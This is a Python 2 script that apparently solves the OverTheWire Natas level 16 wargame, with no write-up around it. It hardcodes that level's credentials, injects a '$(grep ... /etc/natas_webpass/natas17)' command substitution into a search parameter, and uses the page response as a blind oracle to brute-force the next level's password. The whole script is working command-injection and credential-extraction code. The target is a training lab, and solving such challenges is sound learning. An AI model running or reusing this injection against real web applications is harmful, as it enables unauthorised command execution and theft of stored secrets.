#!/usr/bin/python

import requests
import base64

username = 'natas16'
password = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'

encoded = base64.b64encode('{}:{}'.format(username, password))
auth_header = {'Authorization':'Basic {}'.format(encoded)}

alphanumerics = map(chr, range(65, 91) + range(97,123) + range(48, 58))

def buildurl(string):
    return "http://natas16.natas.labs.overthewire.org/index.php?needle=hello$(grep -n " + string + " /etc/natas_webpass/natas17)"

def validate(string):
    resp = requests.get(buildurl(string), headers=auth_header).text
    return "hello" not in resp

possible_chars = []
for char in alphanumerics:
    if validate(char):
        #print char
        possible_chars.append(char)

password = ""
while len(password) < 32:
    print password
    for char in possible_chars:
        if validate(password + char): password = password + char
        if validate(char + password): password = char + password

print password
print "Done." 
